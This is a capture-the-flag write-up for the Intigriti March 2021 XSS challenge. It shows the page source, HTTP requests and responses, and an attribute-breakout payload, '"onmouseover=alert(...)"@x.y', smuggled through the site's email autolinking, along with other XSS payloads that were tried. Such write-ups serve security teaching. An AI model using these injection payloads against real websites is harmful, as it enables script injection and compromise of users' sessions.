
Intigriti March XSS challenge

Problem Statement
----------------------
URL : https://challenge-0321.intigriti.io/

![image](https://user-images.githubusercontent.com/19681324/113403529-6c9c7c80-93c4-11eb-8f6f-b5aa5ee503e0.png)

Let's Pop an alert
------------------
At the bottom of the page there is an **Your notes:** section. 
![image](https://user-images.githubusercontent.com/19681324/113403778-d026aa00-93c4-11eb-88f6-7d793631fccc.png)

Check out the source of the html page
```html
  <div class="card-container">
         <form method="POST" action="./" id="update-notes">
            <div class="card-header">Your notes:<span id="actions"><a id="notes-save" href="#">save</a></span></div>
            <p id="notes-display" class="card-content" contenteditable="true">No notes saved.</p>
            <input type="hidden" name="csrf" value="6896be5ae9b23b85432afab717277824"/>
            <input type="hidden" id="notes-value"  name="notes" value=""/>
         </form>
      </div>
      <script>
          var _note = document.getElementById("notes-display").innerText;   // (1)
          document.getElementById("notes-display").onkeyup = function(e){   // (2)
            var note = document.getElementById("notes-display").innerText;
            if(note != _note){
              document.getElementById("notes-save").style.visibility = "visible";
            }
            else{
              document.getElementById("notes-save").style.visibility = "hidden";
            }
          }
          document.getElementById("notes-save").onclick = function(e){  // (3)
            document.getElementById('notes-value').value = document.getElementById('notes-display').innerText;
            this.closest('form').submit();
            return false;
          }
      </script>
   </body>
   <!-- page generated at 2021-04-02 09:36:09 --> 
</html>
```
Break down the source in different steps:
  - There is a form with id update-notes. Notable thing in the form is `<p>` tag with attribute `contenteditable="true"`, we will revisit this cause this important.
    - Form has two hidden input field: csrf , notes
    - csrf value 6896be5ae9b23b85432afab717277824 seems to be an MD5 value
    - ![image](https://user-images.githubusercontent.com/19681324/113405642-c6eb0c80-93c7-11eb-9e47-f29410a59178.png)
  - Script section
    - (1) declare _note and assing innerText of note-display paragraph
    - (2) onkeyup event on note-display check note-display paragraph innerText is changed, if yes then display the save button, else hide the save button
    - (3) on clicking the save button assign the innerText of notes-display to notes-value and submit the form.
  - one more interesting thing to note is the comment `<!-- page generated at 2021-04-02 09:36:09 --> ` at the bottom of the page

Changing the note and clicking on save will send a POST request and updated note will be reflected on the page
```
POST / HTTP/1.1
Host: challenge-0321.intigriti.io
Connection: close
Content-Length: 58
Cookie: PHPSESSID=46c7eeb13d285bc57ef010c799372735

csrf=36cd9b23b082ae06c73c73e79a6dc64f&notes=No+notes+saved
```
If we add  special character like <> , & these were being html escaped in the response from the server, however charaters like !, #, $, @, ^,*,(,),',"  were not html escaped
```
POST / HTTP/1.1
Host: challenge-0321.intigriti.io
Cookie: PHPSESSID=46c7eeb13d285bc57ef010c799372735

csrf=504d6da7a099d980ac787f87850626b4&notes=No+notes+saved+%3C%3E%3C%3C%21%23%24%40%5E%26*%23%28%23%29+%27%22%2C
```
Response

```html
     <div class="card-container">
         <form method="POST" action="./" id="update-notes">
            <div class="card-header">Your notes:<span id="actions"><a id="notes-save" href="#">save</a></span></div>
            <p id="notes-display" class="card-content" contenteditable="true">No notes saved &lt;&gt;&lt;&lt;!#$@^&amp;*#(#) '",</p>
            <input type="hidden" name="csrf" value="be98377d284ac8c558ac9c8303f50ab1"/>
            <input type="hidden" id="notes-value"  name="notes" value=""/>
         </form>
      </div>
```

One interesting transformation of response occure while updating note-display to an url or email
```
POST / HTTP/1.1
Host: challenge-0321.intigriti.io
Cookie: PHPSESSID=46c7eeb13d285bc57ef010c799372735

csrf=e15e6d924554f427fd53ff9b5b319069&notes=https://www.google.com+abc@def.com
```
Response
```html
<p id="notes-display" class="card-content" contenteditable="true">
  <a href="https://www.google.com " target="_blank">https://www.google.com </a>
  <a href="mailto:abc@def.com">abc@def.com</a>
</p>
```
URL and email addresses are turning into an anchor tag.
![image](https://user-images.githubusercontent.com/19681324/113423650-7df97f00-93ec-11eb-8e96-b8fda73ef182.png)

However invalid email addresses and URL were not getting transformed e.g. invalid url- https:/www.google.com   invalid email - @soemthing.com
```html
  <p id="notes-display" class="card-content" contenteditable="true">
    https:/www.google.com  @soemthing.com
  </p>
```

Tried a lot with url to escape the anchor tag and alert the flag, but didn't work. 
Doing a simple google search with the text xss email payload , first result is https://brutelogic.com.br/blog/xss-limited-input-formats/  which suggest a xss payload to use is `"<svg/onload=alert(1)>"@x.y` , bruteforce tweets this as well
![image](https://user-images.githubusercontent.com/19681324/113426701-79839500-93f1-11eb-8a37-c33d39ec712b.png)

but <> characters are escaped by the server side
```
<a href="mailto:"&lt;svg/onload=alert(1)&gt;"@x.y">"&lt;svg/onload=alert(1)&gt;"@x.y</a>
```
however " are not escaped, as we can see avobe we came out of href attribute. So changing the payload slightly to `"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y` we get a response like this
```
<p id="notes-display" class="card-content" contenteditable="true">
<a href="mailto:"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y">"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y</a>
```
which gets us an alert 
![image](https://user-images.githubusercontent.com/19681324/113427645-0a0ea500-93f3-11eb-93b3-9571e871e645.png)






Things i tried but didn't work
------------------------------

tried `javascript://%0Aalert(1)`
tried `"<svg/onload=alert(1)>"@x.y`
